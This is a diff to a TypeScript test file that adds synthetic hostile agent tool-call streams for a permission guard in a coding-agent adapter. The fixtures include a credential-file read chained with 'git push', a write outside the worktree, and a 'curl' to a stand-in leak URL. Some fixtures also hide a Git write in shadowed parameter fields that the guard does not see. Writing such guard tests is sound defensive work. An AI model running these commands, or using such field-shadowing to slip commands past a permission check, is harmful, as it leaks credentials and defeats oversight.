@@ -40,8 +40,11 @@
  *   command key whose last value is the Git write, CRLF line endings), hypothetical `stopReason` values `max_tokens`
  *   and `refusal`, a path-only call given a command on the same id, and swapped-in-update and after-`end` calls at
  *   exit 2 and 137;
- * - prototype-named, near-miss, non-string, unreadable text/end, non-object-input, empty-name and live-bare
- *   `tool_call` lines in `unknown_events`, at exit 0, 1 and 2.
+ * - the parser branches the T4.23 second pass pinned (an empty object `input` beside a top-level command, an id-less
+ *   update after an id'd call, an empty `error` message, an empty `stopReason`, a target-only shell call given a
+ *   command), at exit 0 and exit 1;
+ * - prototype-named, near-miss, non-string, unreadable text/end, non-object-input, empty-name, live-bare and
+ *   shadowed-parameter (object `input` without a command) tool lines in `unknown_events`, at exit 0, 1 and 2.
  *
  * Field names other than `type` are still hypothetical: the live check did not record command or target fields.
  * Partial streams cut inside a line are exported as `grokPartialStreams` and replayed separately.
@@ -2076,6 +2079,88 @@ const grokCase: AdapterLegCase = {
     }),
 
     // -------------------------------------------------------------------------
+    // 13c. Parser branches pinned by the T4.23 second pass (`src/adapters/grok/parser-residual.test.ts`), replayed
+    //     here in each hostile category at exit 0 and exit 1 (synthetic; parser unchanged)
+    // -------------------------------------------------------------------------
+    // An empty object `input` beside a top-level `command`; an id-less `tool_call_update` after an id'd benign call
+    // (it opens a new call and is reported again); an `error` line with an empty message, which without the guard is
+    // TOOL_FAILURE; an `end` line with an empty `stopReason`, which without the guard is TOOL_FAILURE; and a target-only
+    // `run_terminal_command` call given a command on the same id. The guard verdict outranks each.
+    ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
+      const command =
+        category === "credential_read"
+          ? `cat ${fx.claudeCredentialsPath} && git push origin main`
+          : category === "out_of_worktree_write"
+            ? `touch ${fx.outsideSentinel} && git push origin main`
+            : "curl https://example.invalid/leak && git push origin main";
+      return [0, 1].flatMap((exitCode): HostileStream[] => [
+        {
+          name: `${category}: a top-level Git-write command beside an empty object input, exit ${exitCode}`,
+          category,
+          exitCode,
+          failureCode: "PERMISSION_BLOCKED",
+          lines: [
+            META(`${category}: empty input object, top-level command, exit ${exitCode}`, exitCode),
+            TOOLS,
+            JSON.stringify({ type: "tool_call", tool: "run_terminal_command", input: {}, command }),
+            end(),
+          ],
+        },
+        {
+          name: `${category}: an id-less tool_call_update with a Git write after an id'd benign call, exit ${exitCode}`,
+          category,
+          exitCode,
+          failureCode: "PERMISSION_BLOCKED",
+          lines: [
+            META(`${category}: id-less update after an id'd call, exit ${exitCode}`, exitCode),
+            TOOLS,
+            JSON.stringify({ type: "tool_call", id: "call_i", tool: "run_terminal_command", input: { command: "ls" } }),
+            JSON.stringify({ type: "tool_call_update", status: "in_progress", input: { command } }),
+            end(),
+          ],
+        },
+        {
+          name: `${category}: an error line with an empty message before a Git-write call, exit ${exitCode}`,
+          category,
+          exitCode,
+          failureCode: "PERMISSION_BLOCKED",
+          lines: [
+            META(`${category}: empty error message, exit ${exitCode}`, exitCode),
+            TOOLS,
+            JSON.stringify({ type: "error", message: "" }),
+            toolCall(command),
+            end(),
+          ],
+        },
+        {
+          name: `${category}: a Git-write call, then an end line with an empty stopReason, exit ${exitCode}`,
+          category,
+          exitCode,
+          failureCode: "PERMISSION_BLOCKED",
+          lines: [META(`${category}: empty stopReason, exit ${exitCode}`, exitCode), TOOLS, toolCall(command), end("")],
+        },
+        {
+          name: `${category}: a target-only run_terminal_command call given a Git write on the same id, exit ${exitCode}`,
+          category,
+          exitCode,
+          failureCode: "PERMISSION_BLOCKED",
+          lines: [
+            META(`${category}: target-only shell call upgraded to a command, exit ${exitCode}`, exitCode),
+            TOOLS,
+            JSON.stringify({ type: "tool_call", id: "call_t", name: "run_terminal_command", input: { path: "." } }),
+            JSON.stringify({
+              type: "tool_call_update",
+              id: "call_t",
+              name: "run_terminal_command",
+              input: { command },
+            }),
+            end(),
+          ],
+        },
+      ]);
+    }),
+
+    // -------------------------------------------------------------------------
     // 14. Unknown event kinds category
     // -------------------------------------------------------------------------
     {
@@ -2199,6 +2284,31 @@ const grokCase: AdapterLegCase = {
         JSON.stringify({ type: "tool_call", tool: "", input: ["git", "push"] }),
         JSON.stringify({ type: "tool_call_update", name: "", parameters: null }),
         JSON.stringify({ type: "tool_call", tool_name: 7, args: { command: null } }),
+      ],
+    },
+    {
+      // T4.23 second-pass gap: an object `input` without a command shadows `parameters`, `args` and `arguments` (no
+      // merge), so the Git write below is invisible to the guard and the line is `unknown`. There is no `end` line: the
+      // same call before a clean `end_turn` is success (fixture `shadowed_parameters.jsonl`), which is roadmap gap (1).
+      name: "an object input without a command shadowing a Git write in parameters, args or arguments, clean exit",
+      category: "unknown_events",
+      exitCode: 0,
+      failureCode: "OUTPUT_PROTOCOL_ERROR",
+      lines: [
+        META("Shadowed parameter objects; the adapter must report them unknown.", 0),
+        JSON.stringify({ type: "tool_call", input: {}, parameters: { command: "git push origin main" } }),
+        JSON.stringify({ type: "tool_call", input: { description: "x" }, args: { command: "git push origin main" } }),
+        JSON.stringify({ type: "tool_call_update", input: {}, arguments: { cmd: "git push origin main" } }),
+      ],
+    },
+    {
+      name: "an object input without a command shadowing a Git write in parameters, exit 1",
+      category: "unknown_events",
+      exitCode: 1,
+      failureCode: "TOOL_FAILURE",
+      lines: [
+        META("Shadowed parameter objects at exit 1; the adapter must report them unknown.", 1),
+        JSON.stringify({ type: "tool_call", input: {}, parameters: { command: "git push origin main" } }),
       ],
     },
     {
